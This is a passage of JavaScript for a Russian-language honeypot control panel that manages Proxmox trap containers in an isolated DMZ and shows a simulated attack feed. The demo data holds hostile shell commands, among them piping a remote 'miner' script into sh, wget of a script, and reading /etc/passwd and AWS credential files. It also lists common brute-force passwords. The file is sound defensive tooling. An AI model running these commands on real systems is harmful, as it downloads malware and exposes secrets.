"use strict";
const $ = (id) => document.getElementById(id);
const el = (tag, text, cls) => { const e = document.createElement(tag); if (text !== undefined) e.textContent = text; if (cls) e.className = cls; return e; };
const pick = (a) => a[Math.floor(Math.random() * a.length)];
const rnd = (a, b) => Math.floor(a + Math.random() * (b - a + 1));
const hex = (n) => Array.from({ length: n }, () => rnd(0, 15).toString(16)).join("");
const calm = window.matchMedia && window.matchMedia("(prefers-reduced-motion: reduce)").matches;
let seq = 1; const uid = () => seq++;

let csrf = "";

// ============ СОСТОЯНИЯ ============
const STATES = {
  online:   { label: "Работает",         hint: "Машина запущена, агент на связи, ловушки принимают подключения" },
  creating: { label: "Создаётся…",       hint: "Proxmox клонирует шаблон, задаёт ресурсы и сеть, устанавливает агент" },
  starting: { label: "Запускается…",     hint: "Машина стартует, ждём подключения агента" },
  waiting:  { label: "Ждёт подключения", hint: "Машина создана, но агент внутри ещё не вышел на связь" },
  offline:  { label: "Не отвечает",      hint: "Агент давно не выходил на связь: проверьте машину в Proxmox" },
  stopped:  { label: "Выключен",         hint: "Машина остановлена вами: ловушки не принимают подключения" },
};
const ORDER = ["online", "creating", "starting", "waiting", "offline", "stopped"];

// ============ PROXMOX ============
const PVE = {
  node: "pve",
  bridge: "vmbr1",                      // отдельный bridge под DMZ: ловушки не видят домашнюю LAN и прод
  bridgeLabel: "vmbr1 · DMZ (изолированная сеть)",
  templates: { lxc: 9000, kvm: 9001 },  // VMID шаблонов для клонирования — уточнить под ваш Proxmox
  vmidFrom: 1000,                       // ловушки получают VMID от 1000 и выше
  defaults: { cores: 1, ram: 1, disk: 10 },
  limits: { cores: [1, 32], ram: [1, 128], disk: [10, 1000] },
};
const TYPE_INFO = {
  lxc: { label: "LXC", title: "Контейнер", kind: "CT", cli: "pct", desc: "Лёгкий, стартует за секунды. Подходит для Low и Medium." },
  kvm: { label: "KVM", title: "Виртуальная машина", kind: "VM", cli: "qm", desc: "Полноценная ОС и сильнее изоляция. Дольше стартует." },
};
const plural = (n, one, few, many) => (n % 10 === 1 && n % 100 !== 11 ? one : n % 10 >= 2 && n % 10 <= 4 && (n % 100 < 10 || n % 100 >= 20) ? few : many);
const resParts = (c) => [c.cores + " " + plural(c.cores, "ядро", "ядра", "ядер"), c.ram + " ГБ ОЗУ", c.disk + " ГБ диск"];

// ============ ДЕМО-ДАННЫЕ ============
// Всё ниже — примерные данные для показа. Реальные придут из API центра (Proxmox API + агенты).
// Модель: «контейнер» = LXC-контейнер или KVM-машина в Proxmox; внутри один агент и несколько ловушек; порты не пересекаются.
const profiles = [
  { name: "ssh-low", level: "low", desc: "Открытые порты SSH и Telnet с правдоподобными баннерами",
    services: [{ port: 22, proto: "banner", banner: "SSH-2.0-OpenSSH_7.4" }, { port: 23, proto: "banner", banner: "" }], users: [], tokens: [], beacon: 15, jitter: 0.3 },
  { name: "web-admin-medium", level: "medium", desc: "Поддельная веб-админка с формой входа и файлами-приманками",
    services: [{ port: 8080, proto: "http", banner: "Apache/2.4.41 (Ubuntu)" }, { port: 8081, proto: "http", banner: "" }], users: ["admin", "webmaster"], tokens: ["/backup.sql"], beacon: 15, jitter: 0.3 },
  { name: "db-medium", level: "medium", desc: "Поддельный SSH-доступ и порты MySQL/PostgreSQL",
    services: [{ port: 2222, proto: "ssh", banner: "" }, { port: 3306, proto: "banner", banner: "5.7.42-0ubuntu0.18.04.1" }, { port: 5432, proto: "banner", banner: "" }],
    users: ["root", "postgres"], tokens: ["/root/.aws/credentials"], beacon: 20, jitter: 0.4 },
  { name: "ftp-low", level: "low", desc: "Баннер FTP-сервера: фиксирует сканирование и попытки входа",
    services: [{ port: 21, proto: "banner", banner: "220 ProFTPD 1.3.5 Server" }], users: [], tokens: [], beacon: 15, jitter: 0.3 },
];
const ago = (s) => Date.now() - s * 1000;
// link: creating | never | starting | online | offline;  enabled: включена ли машина оператором (start/stop)
const vm = (name, type, vmid, host, enabled, link, seen, res) => ({ id: uid(), name, type, vmid, node: PVE.node, bridge: PVE.bridge, host, enabled, link, seen,
  ...PVE.defaults, ...(res || {}) });
const containers = [
  vm("edge-dmz-1", "lxc", 1000, "10.20.0.11", true, "online", ago(3)),
  vm("edge-dmz-2", "lxc", 1001, "10.20.0.12", true, "online", ago(8), { ram: 2 }),
  vm("lab-old", "kvm", 1002, "10.20.0.14", true, "offline", ago(1620), { cores: 2, ram: 2, disk: 20 }),
  vm("lab-spare", "lxc", 1003, "10.20.0.17", false, "online", ago(40)),
  vm("lab-new", "kvm", 1004, "", true, "never", null),
];
const trap = (name, container, profile, events) => ({ id: uid(), name, container, profile, enabled: true, events });
const traps = [
  trap("ssh-bait", "edge-dmz-1", "ssh-low", 412), trap("web-admin", "edge-dmz-1", "web-admin-medium", 936), trap("ftp-bait", "edge-dmz-1", "ftp-low", 121),
  trap("db-bait", "edge-dmz-2", "db-medium", 287), trap("ssh-bait-2", "edge-dmz-2", "ssh-low", 198),
  trap("ssh-old", "lab-old", "ssh-low", 54), trap("ftp-spare", "lab-spare", "ftp-low", 12), trap("web-new", "lab-new", "web-admin-medium", 0),
];
const IPS = ["185.220.101.34", "45.155.205.233", "194.165.16.77", "103.99.0.12", "89.248.165.200", "203.0.113.7", "91.240.118.50"];
const USERS = ["root", "admin", "ubuntu", "test", "oracle", "postgres", "user"];
const PASSES = ["123456", "admin", "password", "toor", "qwerty", "admin123", "P@ssw0rd", "letmein"];
const CMDS = ["uname -a", "cat /etc/passwd", "wget http://198.51.100.9/x.sh", "ls -la", "id", "cat /root/.aws/credentials", "curl -s http://198.51.100.9/miner | sh"];
const PATHS = ["GET /admin HTTP/1.1", "GET /wp-login.php HTTP/1.1", "POST /login HTTP/1.1", "GET /.env HTTP/1.1", "GET /phpmyadmin/ HTTP/1.1"];
const TYPES = ["connect", "auth_attempt", "command", "http_request", "payload", "honeytoken", "alert"];

const S = {
  events: [], nextId: 1, paused: false, editing: null, hoverTop: false,
  cFilter: { q: "", status: "" },
  filter: { type: "", trap: "", q: "" },
  total: 2410, auth: 1180, alert: 6,
  src: { "185.220.101.34": 412, "45.155.205.233": 301, "194.165.16.77": 186, "103.99.0.12": 142, "89.248.165.200": 97 },
  pw: { "123456": 233, "admin": 190, "password": 151, "toor": 98, "qwerty": 77 },
  buckets: Array.from({ length: 60 }, () => rnd(2, 24)),
};

// ============ МОДЕЛЬ ============
const trapByName = (n) => traps.find((t) => t.name === n);
const containerByName = (n) => containers.find((c) => c.name === n);
const profileByName = (n) => profiles.find((p) => p.name === n);
const trapsOf = (cname) => traps.filter((t) => t.container === cname);
const levelOf = (name) => (profileByName(name) || {}).level || "—";
const portsOf = (profile, lookup = profileByName) => ((lookup(profile) || { services: [] }).services).map((s) => s.port);
const alive = (c) => containers.includes(c);

function cState(c) {
  if (c.link === "creating") return "creating";
  if (!c.enabled) return "stopped";
  if (c.link === "never") return "waiting";
  return c.link;
}
function trapState(t) {
  const c = containerByName(t.container);
  if (!c) return "offline";
  const cs = cState(c);
  return cs === "online" && !t.enabled ? "stopped" : cs;
}
function containerPorts(cname) { return [...new Set(trapsOf(cname).flatMap((t) => portsOf(t.profile)))].sort((a, b) => a - b); }
function portConflicts(entries, lookup = profileByName) {  // порты внутри одной машины не должны пересекаться
  const byPort = new Map();
  for (const e of entries) for (const p of portsOf(e.profile, lookup)) byPort.set(p, [...(byPort.get(p) || []), e.name]);
  return [...byPort].filter(([, names]) => names.length > 1).map(([p, names]) => "Порт " + p + " занят дважды: " + names.join(", "));
}
function uniqueName(base, taken = new Set()) { let n = 1, name = base; while (taken.has(name) || trapByName(name)) name = base + "-" + (++n); return name; }
const baseName = (profile) => profile.replace(/-(low|medium)$/, "") + "-bait";
function nextVmid() { const used = new Set(containers.map((c) => c.vmid)); let id = PVE.vmidFrom; while (used.has(id)) id++; return id; }
function uniqueContainerName(base) { let n = containers.length + 1; while (containerByName(base + "-" + n)) n++; return base + "-" + n; }
function iconFor(p) {
  const n = p.name.toLowerCase();
  if (/ssh/.test(n)) return "SSH"; if (/web|http/.test(n)) return "WEB"; if (/db|sql/.test(n)) return "DB"; if (/ftp/.test(n)) return "FTP";
  const proto = (p.services[0] || {}).proto || "tcp"; return proto === "banner" ? "TCP" : proto.toUpperCase();
}

// ============ ДЕМО-ПОТОК СОБЫТИЙ ============
function fakeEvent() {
  const online = traps.filter((t) => trapState(t) === "online");
  if (!online.length) return null;
  const tr = pick(online);
  const prof = profileByName(tr.profile) || { services: [{ port: 22, proto: "banner" }], level: "low", users: [], tokens: [] };
  const svc = pick(prof.services);
  const r = Math.random();
  let type = "connect", cmd = "TCP-подключение", username = "", password = "";
  if (r > 0.4) { type = "auth_attempt"; username = pick(prof.users.length ? [...prof.users, ...USERS] : USERS); password = pick(PASSES); cmd = username + " / " + password; }
  if (r > 0.72 && prof.level !== "low") { type = "command"; cmd = pick(CMDS); }
  if (r > 0.82 && svc.proto === "http") { type = "http_request"; cmd = pick(PATHS); }
  if (r > 0.96 && prof.level !== "low") { type = "honeytoken"; cmd = prof.tokens[0] || "/root/.aws/credentials"; }
  if (r > 0.985) { type = "alert"; cmd = rnd(8, 30) + " попыток входа за 60 с"; }
  return { id: S.nextId++, ts: Date.now(), trap: tr.name, container: tr.container, type, src_ip: pick(IPS), src_port: rnd(1024, 65535),
    dst_port: svc.port, proto: svc.proto === "banner" ? "tcp" : svc.proto, session_id: hex(16), username, password, command: cmd };
}
function ingest(ev) {
  S.events.unshift(ev); if (S.events.length > 500) S.events.pop();
  S.total++; S.src[ev.src_ip] = (S.src[ev.src_ip] || 0) + 1;
  if (ev.type === "auth_attempt") { S.auth++; S.pw[ev.password] = (S.pw[ev.password] || 0) + 1; }
  if (ev.type === "alert") S.alert++;
  S.buckets[59]++;
  const t = trapByName(ev.trap); if (t) t.events++;
  const c = containerByName(ev.container); if (c) c.seen = Date.now();
}

// ============ ВСПОМОГАТЕЛЬНОЕ ============
function toast(msg, bad) {
  const t = $("toast"); t.textContent = msg; t.className = "toast" + (bad ? " bad" : "");
  clearTimeout(toast.timer); toast.timer = setTimeout(() => t.classList.add("hidden"), 3200);
}
function download(name, text) {
  const a = el("a"); a.href = URL.createObjectURL(new Blob([text], { type: "text/csv;charset=utf-8" })); a.download = name;
  document.body.append(a); a.click(); a.remove(); setTimeout(() => URL.revokeObjectURL(a.href), 1000);
}
const csvCell = (v) => { let s = String(v ?? ""); if (/^[=+\-@\t\r]/.test(s)) s = "'" + s; return '"' + s.replace(/"/g, '""') + '"'; };  // защита от формул Excel
async function copy(text) { try { await navigator.clipboard.writeText(text); toast("Скопировано"); } catch (_) { toast("Не удалось скопировать: выделите текст вручную", true); } }
function since(ts) {
  if (!ts) return "никогда";
  const s = Math.max(0, Math.round((Date.now() - ts) / 1000));
  if (s < 60) return s + " с назад"; if (s < 3600) return Math.round(s / 60) + " мин назад"; return Math.round(s / 3600) + " ч назад";
}
const fmtTime = (ts) => new Date(ts).toLocaleTimeString("ru-RU");
function emptyRow(cols, text) { const tr = el("tr"); const td = el("td", text, "empty"); td.colSpan = cols; tr.append(td); return tr; }
function fillSelect(sel, options) {
  const prev = sel.value;
  sel.replaceChildren(...options.map(([value, label]) => { const o = el("option", label); o.value = value; return o; }));
  if (options.some(([v]) => v === prev)) sel.value = prev;
}
function makeClickable(node, handler) {
  node.tabIndex = 0; node.onclick = handler;
  node.onkeydown = (e) => { if (e.target === node && (e.key === "Enter" || e.key === " ")) { e.preventDefault(); handler(e); } };
}
function setText(node, text) { if (node.textContent !== text) node.textContent = text; }  // без «прыжков» цифр
function seenSpan(c) { const s = el("span", since(c.seen), "c-seen"); s.dataset.c = c.id; return s; }

// ============ ПОДСКАЗКИ ПРИ НАВЕДЕНИИ ============
// Любой элемент с title или data-tip получает быструю подсказку в стиле панели (системная title отключается).
const HELP = {
  agent: "Агент — небольшая фоновая программа внутри машины-ловушки. Он получает от центра настройки (какие порты открыть и что отвечать), запускает ловушки, записывает действия атакующего и незаметно отправляет их в центр. Если связь пропала, события копятся у агента и досылаются позже.",
  seen: "Когда агент последний раз выходил на связь с центром. Агент «отмечается» каждые 15–20 секунд со случайным разбросом, чтобы его трафик не выделялся регулярностью.",
  low: "Low — простая ловушка: открывает порт и отвечает баннером сервиса (например, «220 ProFTPD»). Фиксирует сканирование и факт подключения. Риск минимальный.",
  medium: "Medium — ловушка с логикой сервиса: поддельный SSH с консолью, поддельная веб-админка. Собирает логины, пароли, команды и запросы. Внутри — заглушка, а не настоящая система.",
  dmz: "DMZ — отдельная изолированная сеть для ловушек. Из неё не видно домашнюю сеть, прод и центр управления: даже взломав ловушку, атакующий не уйдёт дальше.",
  beacon: "Маяк — периодический запрос агента к центру за настройками. Интервал — как часто, джиттер — случайный разброс (0.3 = ±30%), чтобы запросы не шли строго по часам.",
  honeytoken: "Honeytoken — файл-приманка (ключи, бэкап, пароли). Сам по себе он не нужен никому, кроме атакующего, поэтому любое обращение к нему — верный признак взлома.",
};
const EVENT_HELP = {
  connect: "Подключение к порту ловушки: кто-то просканировал или открыл соединение.",
  auth_attempt: "Попытка входа: атакующий ввёл логин и пароль.",
  command: "Команда, выполненная атакующим в поддельной консоли.",
  http_request: "HTTP-запрос к поддельному веб-сервису.",
  payload: "Данные, которые атакующий отправил в порт (полезная нагрузка).",
  honeytoken: "Атакующий открыл файл-приманку (honeytoken) — признак настоящего взлома.",
  alert: "Тревога центра: например, слишком много попыток входа с одного IP за минуту (перебор паролей).",
};
const tipped = (node, text) => { node.dataset.tip = text; return node; };
const q = (text) => { const s = el("span", "?", "q"); s.tabIndex = 0; s.dataset.tip = text; s.setAttribute("aria-label", text); return s; };

(function tooltips() {
  const tip = el("div", undefined, "tip"); tip.setAttribute("role", "tooltip"); tip.id = "tip"; document.body.append(tip);
  let current = null, timer = 0;
  const find = (n) => (n && n.closest ? n.closest("[data-tip], [title]") : null);
  function show(node) {
    if (node.hasAttribute("title")) { node.dataset.tip = node.title; node.removeAttribute("title"); }  // без системной подсказки
    const text = node.dataset.tip; if (!text) return;
    current = node; tip.textContent = text; node.setAttribute("aria-describedby", "tip");
    tip.classList.remove("on"); tip.style.left = "0px"; tip.style.top = "0px";
    const r = node.getBoundingClientRect(), w = tip.offsetWidth, h = tip.offsetHeight, pad = 8;
    let top = r.top - h - pad; if (top < pad) top = r.bottom + pad;
    const left = Math.min(Math.max(pad, r.left + r.width / 2 - w / 2), innerWidth - w - pad);
    tip.style.left = left + "px"; tip.style.top = top + "px";
    requestAnimationFrame(() => tip.classList.add("on"));
  }
  function hide() { clearTimeout(timer); if (current) current.removeAttribute("aria-describedby"); current = null; tip.classList.remove("on"); }
  document.addEventListener("mouseover", (e) => {
    const n = find(e.target); if (n === current) return;
    hide(); if (!n) return;
    if (n.hasAttribute("title")) { n.dataset.tip = n.title; n.removeAttribute("title"); }
    timer = setTimeout(() => show(n), 220);
  });
  document.addEventListener("focusin", (e) => { const n = find(e.target); hide(); if (n && e.target.matches(":focus-visible")) show(n); });
  document.addEventListener("focusout", hide);
  document.addEventListener("mousedown", hide);
  addEventListener("scroll", hide, true);
  document.addEventListener("keydown", (e) => { if (e.key === "Escape") hide(); });
})();

const levelTag = (level) => tipped(el("span", level === "low" ? "Low" : level === "medium" ? "Medium" : "—", "tag " + level), HELP[level] || "Профиль не задан");
const typeTag = (type) => tipped(el("span", type, "tag t-" + type), EVENT_HELP[type] || type);

function stateBadge(state) {
  const wrap = el("span", undefined, "cstate"); wrap.title = STATES[state].hint;
  wrap.append(el("span", undefined, "dot " + state), el("span", STATES[state].label, "st-label " + state));
  return wrap;
}
// Переключатель «Включён/Выключен»: ползунок анимируется сразу, действие — после анимации
function switchEl(on, title, onToggle, disabled) {
  const b = el("button", undefined, "switch" + (disabled ? " busy" : "")); b.type = "button"; b.setAttribute("role", "switch");
  b.setAttribute("aria-checked", String(on)); b.title = title; if (disabled) b.disabled = true;
  const track = el("span", undefined, "track"); track.append(el("span", undefined, "knob"));
  const label = el("span", on ? "Включён" : "Выключен");
  b.append(track, label);
  b.onclick = (e) => {
    e.stopPropagation();
    b.setAttribute("aria-checked", String(!on)); label.textContent = on ? "Выключен" : "Включён"; b.classList.add("busy");
    setTimeout(onToggle, calm ? 0 : 280);
  };
  return b;
}

// Точечное обновление списка: пересоздаются только изменившиеся элементы, остальные остаются на месте без перерисовки.
function reconcile(box, items, { key, sig, build, empty, animate }) {
  if (!items.length) { box.replaceChildren(empty()); return; }
  const old = new Map();
  for (const n of box.children) if (n.dataset && n.dataset.key) old.set(n.dataset.key, n);
  const first = old.size === 0;
  const want = items.map((it, i) => {
    const k = String(key(it)), s = sig(it);
    let n = old.get(k);
    if (!n || n.dataset.sig !== s) {
      const fresh = build(it); fresh.dataset.key = k; fresh.dataset.sig = s;
      if (animate && !calm) { fresh.classList.add(n ? "upd" : "enter"); if (!n && first) fresh.style.animationDelay = Math.min(i, 8) * 45 + "ms"; }
      n = fresh;
    }
    return n;
  });
  for (const n of [...box.children]) if (!want.includes(n)) n.remove();
  want.forEach((n, i) => { if (box.children[i] !== n) box.insertBefore(n, box.children[i] || null); });
}

// ---- модальное окно (анимация только при открытии, а не при обновлении содержимого) ----
function openModal(title, build) {
  $("modal-title").textContent = title;
  $("modal-body").replaceChildren(); build($("modal-body"));
  $("modal").classList.remove("hidden");
}
function closeModal() { $("modal").classList.add("hidden"); }
$("modal-close").onclick = closeModal;
$("modal").onclick = (e) => { if (e.target === $("modal")) closeModal(); };
document.addEventListener("keydown", (e) => { if (e.key === "Escape") closeModal(); });
function kv(rows) {
  const dl = el("dl", undefined, "kv");
  for (const [k, v] of rows) { dl.append(el("dt", k)); const dd = el("dd"); if (v instanceof Node) dd.append(v); else dd.textContent = v === "" ? "—" : String(v); dl.append(dd); }
  return dl;
}
function armed(btn, label, action) {  // подтверждение опасного действия вторым нажатием
  const old = btn.textContent;
  btn.onclick = (e) => {
    if (e) e.stopPropagation();
    if (btn.classList.contains("arm")) { btn.classList.remove("arm"); btn.textContent = old; action(); return; }
    btn.classList.add("arm"); btn.textContent = label;
    setTimeout(() => { btn.classList.remove("arm"); btn.textContent = old; }, 3000);
  };
}
function field(labelText, input) { const wrap = el("div"); wrap.append(el("label", labelText), input); return wrap; }
function numInput(value, [min, max], label) { const i = el("input"); i.type = "number"; i.min = min; i.max = max; i.step = 1; i.value = value; i.setAttribute("aria-label", label); return i; }
function showTab(tab) {
  for (const b of $("nav").children) b.classList.toggle("on", b.dataset.tab === tab);
  for (const s of ["containers", "dash", "traps", "profiles"]) $("tab-" + s).classList.toggle("hidden", s !== tab);
}
function renderAll() { renderContainers(); renderCatalog(); renderProfiles(); renderFilters(); renderKpis(); }

// ============ ВЫБОР ЛОВУШЕК КАРТОЧКАМИ ============
// Карточки создаются один раз; при выборе меняются только классы — анимация отметки играет только у нажатой карточки.
function buildPicker(box, { existing, selected, multi, onChange }) {
  const cards = new Map();
  box.replaceChildren();
  for (const p of profiles) {
    const card = el("button", undefined, "pcard"); card.type = "button";
    card.append(el("span", iconFor(p), "badge"));
    const title = el("div"); title.append(el("span", p.name, "pn"), " ", levelTag(p.level)); card.append(title);
    card.append(el("div", p.desc || ("Сервисов: " + p.services.length), "pd"));
    const ports = el("div", undefined, "ports"); for (const s of p.services) ports.append(el("span", s.port + "/" + s.proto)); card.append(ports);
    const why = el("div", "", "why"); why.hidden = true; card.append(why);
    card.onclick = () => {
      if (card.dataset.clash) { toast("Нельзя: " + why.textContent, true); return; }
      if (selected.has(p.name)) selected.delete(p.name); else { if (!multi) selected.clear(); selected.add(p.name); }
      update(); onChange && onChange();
    };
    cards.set(p.name, { card, why });
    box.append(card);
  }
  function update() {
    const used = new Map();
    for (const t of existing) for (const port of portsOf(t.profile)) used.set(port, t.name);
    for (const name of selected) for (const port of portsOf(name)) used.set(port, name);
    for (const p of profiles) {
      const { card, why } = cards.get(p.name);
      const isSel = selected.has(p.name);
      const clash = isSel ? null : portsOf(p.name).find((port) => used.has(port));
      card.classList.toggle("sel", isSel);
      card.classList.toggle("off", Boolean(clash));
      card.setAttribute("aria-pressed", String(isSel));
      card.dataset.clash = clash ? String(clash) : "";
      why.hidden = !clash;
      why.textContent = clash ? "порт " + clash + " уже занят: " + used.get(clash) : "";
    }
  }
  update();
}

// ============ КОНТЕЙНЕРЫ (главная) ============
function pveCommands(c) {
  const t = TYPE_INFO[c.type], tpl = PVE.templates[c.type], mem = c.ram * 1024;
  return c.type === "kvm"
    ? ["qm clone " + tpl + " " + c.vmid + " --name " + c.name + " --full", "qm set " + c.vmid + " --cores " + c.cores + " --memory " + mem + " --net0 virtio,bridge=" + c.bridge,
       "qm resize " + c.vmid + " scsi0 " + c.disk + "G", t.cli + " start " + c.vmid].join("\n")
    : ["pct clone " + tpl + " " + c.vmid + " --hostname " + c.name + " --full", "pct set " + c.vmid + " --cores " + c.cores + " --memory " + mem + " --net0 name=eth0,bridge=" + c.bridge + ",ip=dhcp",
       "pct resize " + c.vmid + " rootfs " + c.disk + "G", t.cli + " start " + c.vmid].join("\n");
}

function openPve(c) {
  const t = TYPE_INFO[c.type];
  openModal("Proxmox: " + t.kind + " " + c.vmid + " «" + c.name + "»", (body) => {
    body.append(kv([["Тип", t.label + " — " + t.title], ["VMID", c.vmid], ["Нода", c.node], ["Ресурсы", resParts(c).join(" · ")],
      ["Сеть", PVE.bridgeLabel], ["IP", c.host], ["Ловушки", trapsOf(c.name).map((x) => x.name).join(", ") || "—"]]));
    const steps = el("ol", undefined, "steps");
    const li = (b, rest) => { const x = el("li"); x.append(el("b", b), " " + rest); return x; };
    steps.append(
      li("Клонирование:", "центр через Proxmox API создаёт " + t.kind + " " + c.vmid + " из шаблона " + PVE.templates[c.type] + " с уже установленным агентом."),
      li("Ресурсы и сеть:", resParts(c).join(", ") + "; сетевой интерфейс в " + c.bridge + " (DMZ), без доступа в домашнюю сеть."),
      li("Запуск:", "машина стартует, агент подключается к центру и поднимает ловушки этого контейнера.")
    );
    body.append(el("h4", "Что делает центр"), steps, el("h4", "Эквивалентные команды Proxmox (для справки и ручной отладки)"));
    const pre = el("pre", pveCommands(c)); body.append(pre);
    const row = el("div", undefined, "actions");
    const b = el("button", "Копировать команды", "ghost"); b.onclick = () => copy(pre.textContent);
    const close = el("button", "Закрыть", "ghost"); close.onclick = closeModal;
    row.append(b, close); body.append(row);
  });
}

function bringOnline(c, msg) {
  c.link = "starting"; renderAll();
  setTimeout(() => {
    if (!alive(c) || !c.enabled || c.link !== "starting") return;
    c.link = "online"; c.seen = Date.now(); renderAll(); if (msg) toast(msg);
  }, 1700);
}
function provision(c) {  // демо: клон → старт → агент на связи
  setTimeout(() => {
    if (!alive(c) || c.link !== "creating") return;
    c.host = c.host || "10.20.0." + rnd(20, 99);
    if (!c.enabled) { c.link = "online"; renderAll(); toast(TYPE_INFO[c.type].kind + " " + c.vmid + " создан и остановлен"); return; }
    bringOnline(c, "«" + c.name + "» создан и работает: " + TYPE_INFO[c.type].kind + " " + c.vmid);
  }, 3500);
}
function toggleContainer(c) {
  const t = TYPE_INFO[c.type];
  c.enabled = !c.enabled;
  if (!c.enabled) { if (c.link === "starting") c.link = "online"; renderAll(); toast(t.cli + " shutdown " + c.vmid + " — «" + c.name + "» выключен"); return; }
  if (c.link === "never") { renderAll(); toast(t.cli + " start " + c.vmid + " — ждём подключения агента"); return; }
  bringOnline(c, t.cli + " start " + c.vmid + " — «" + c.name + "» работает");
}
function restartContainer(c) {
  const st = cState(c), t = TYPE_INFO[c.type];
  if (st === "creating") { toast("Машина ещё создаётся", true); return; }
  if (st === "stopped") { toast("Машина выключена — включите её переключателем", true); return; }
  toast(t.cli + " reboot " + c.vmid + "…"); bringOnline(c, "«" + c.name + "» перезапущен");
}
function deleteContainer(c) {
  for (let i = traps.length - 1; i >= 0; i--) if (traps[i].container === c.name) traps.splice(i, 1);
  containers.splice(containers.indexOf(c), 1);
  renderAll(); toast(TYPE_INFO[c.type].cli + " destroy " + c.vmid + " — «" + c.name + "» удалён вместе с ловушками");
}
function removeTrap(t) { traps.splice(traps.indexOf(t), 1); renderAll(); toast("Ловушка «" + t.name + "» убрана"); }

function containerSig(c) {  // всё, что меняет вид карточки (счётчики и «на связи» обновляются на месте)
  return JSON.stringify([c.name, c.type, c.vmid, c.node, c.host, c.enabled, cState(c), c.cores, c.ram, c.disk,
    trapsOf(c.name).map((t) => [t.id, t.name, t.profile, trapState(t)])]);
}

function containerCard(c) {
  const st = cState(c), list = trapsOf(c.name), t = TYPE_INFO[c.type];
  const card = el("div", undefined, "ccard is-" + st);

  const head = el("div", undefined, "chead");
  const tag = el("span", t.label + " · " + t.kind + " " + c.vmid, "vmtag " + c.type); tag.title = t.title + " в Proxmox, нода " + c.node + ".\n" + t.kind + " " + c.vmid + " — номер машины (VMID) в Proxmox.\n" + t.desc;
  head.append(el("h3", c.name), tag,
    switchEl(c.enabled, c.enabled ? "Выключить машину (" + t.cli + " shutdown)" : "Включить машину (" + t.cli + " start)", () => toggleContainer(c), st === "creating"));
  card.append(head);

  const meta = el("div", undefined, "cmeta");
  meta.append(stateBadge(st), " · IP ", tipped(el("span", c.host || "—", "m"), "Адрес машины внутри изолированной сети DMZ"), " · ", tipped(el("span", "на связи"), HELP.seen), " ", seenSpan(c), q(HELP.agent));
  card.append(meta);
  const res = el("div", undefined, "cres");
  const resHelp = ["Сколько ядер процессора выделено машине", "Оперативная память машины", "Размер диска машины (можно только увеличить)"];
  resParts(c).forEach((r, i) => res.append(tipped(el("span", r), resHelp[i])));
  res.append(tipped(el("span", "сеть " + c.bridge + " · DMZ"), HELP.dmz), tipped(el("span", "нода " + c.node), "Физический сервер Proxmox, на котором запущена машина"));
  card.append(res);

  if (st === "creating") {
    const note = el("div", "Proxmox клонирует шаблон и настраивает " + t.kind + " " + c.vmid + "…", "cnote");
    const bar = el("div", undefined, "progress"); bar.append(el("i")); note.append(bar); card.append(note);
  } else if (st === "waiting") {
    const note = el("div", undefined, "cnote");
    note.append("Машина создана, но агент ещё не вышел на связь. Проверьте консоль " + t.kind + " в Proxmox.");
    card.append(note);
  } else if (st === "offline") {
    const note = el("div", undefined, "cnote warn");
    note.append("Агент не выходит на связь (последний раз ", seenSpan(c), "). Проверьте машину: выключите и снова включите её переключателем.");
    card.append(note);
  }

  const items = el("div", undefined, "titems");
  if (!list.length) items.append(el("div", "Пока пусто. Нажмите «+ Добавить ловушку».", "cnone"));
  for (const x of list) {
    const ts = trapState(x);
    const item = el("div", undefined, "titem"); item.title = STATES[ts].label + " — нажмите, чтобы открыть";
    makeClickable(item, () => openTrap(x.name));
    const ev = el("span", String(x.events), "ev"); ev.dataset.trap = x.id; ev.title = "Сколько событий (подключений, попыток входа, команд) записала эта ловушка";
    const rm = el("button", "✕ Убрать", "ghost small x"); rm.title = "Убрать ловушку из контейнера";
    armed(rm, "Точно убрать?", () => removeTrap(x));
    item.append(el("span", undefined, "dot " + ts), el("span", x.name, "nm"), levelTag(levelOf(x.profile)),
      tipped(el("span", portsOf(x.profile).join(", "), "pf"), "Порты, которые слушает ловушка"), ev, rm);
    items.append(item);
  }
  card.append(items);

  const foot = el("div", undefined, "cfoot");
  const bAdd = el("button", "+ Добавить ловушку", "btn small"); bAdd.title = "Запустить в этой машине ещё одну ловушку. Агент поднимет её при ближайшем опросе центра."; bAdd.onclick = () => openAddTrap(c);
  const bEdit = el("button", "⚙ Настройки", "ghost small"); bEdit.title = "Имя, IP, ресурсы машины и список её ловушек"; bEdit.onclick = () => openContainerSettings(c);
  const bPve = el("button", "ⓘ", "ghost small"); bPve.setAttribute("aria-label", "Информация о машине");
  bPve.title = "Информация о машине: что делает центр и эквивалентные команды Proxmox"; bPve.onclick = () => openPve(c);
  const bRe = el("button", "↻", "ghost small"); bRe.setAttribute("aria-label", "Перезапустить машину");
  bRe.title = "Перезапустить машину (" + t.cli + " reboot " + c.vmid + "). Агент снова выйдет на связь через несколько секунд."; bRe.onclick = () => restartContainer(c);
  const bDel = el("button", "🗑", "ghost small danger"); bDel.setAttribute("aria-label", "Удалить машину"); bDel.title = "Удалить машину вместе со всеми ловушками. Нужно нажать дважды."; armed(bDel, "Удалить?", () => deleteContainer(c));
  const icons = el("span", undefined, "cicons"); icons.append(bPve, bRe, bDel);
  foot.append(bAdd, bEdit, icons);
  card.append(foot);
  return card;
}

function renderLegend() {
  $("legend").replaceChildren(...ORDER.map((k) => { const s = el("span"); s.title = STATES[k].hint; s.append(el("span", undefined, "dot " + k), STATES[k].label); return s; }));
}

function renderContainers() {
  const q = S.cFilter.q.trim().toLowerCase();
  const list = containers.filter((c) => {
    if (S.cFilter.status && cState(c) !== S.cFilter.status) return false;
    if (!q) return true;
    return [c.name, c.host, String(c.vmid), c.type, ...trapsOf(c.name).flatMap((t) => [t.name, t.profile])].join(" ").toLowerCase().includes(q);
  });
  reconcile($("containers"), list, {
    key: (c) => c.id, sig: containerSig, build: containerCard, animate: true,
    empty: () => el("div", containers.length ? "Ничего не найдено" : "Контейнеров пока нет — создайте первый", "cnone"),
  });
  const working = containers.filter((c) => cState(c) === "online").length;
  $("c-summary").textContent = containers.length + " машин · " + traps.length + " ловушек · работает: " + working;
}

// Ресурсы: 1 ядро / 1 ГБ / 10 ГБ по шаблону, можно поменять
function resourceFields(init) {
  const cores = numInput(init.cores, PVE.limits.cores, "Ядра"), ram = numInput(init.ram, PVE.limits.ram, "ОЗУ, ГБ"), disk = numInput(init.disk, PVE.limits.disk, "Диск, ГБ");
  const grid = el("div", undefined, "res"); grid.append(field("Ядра", cores), field("ОЗУ, ГБ", ram), field("Диск, ГБ", disk));
  const reset = el("button", "Вернуть шаблон 1 ядро / 1 ГБ / 10 ГБ", "linkbtn"); reset.type = "button";
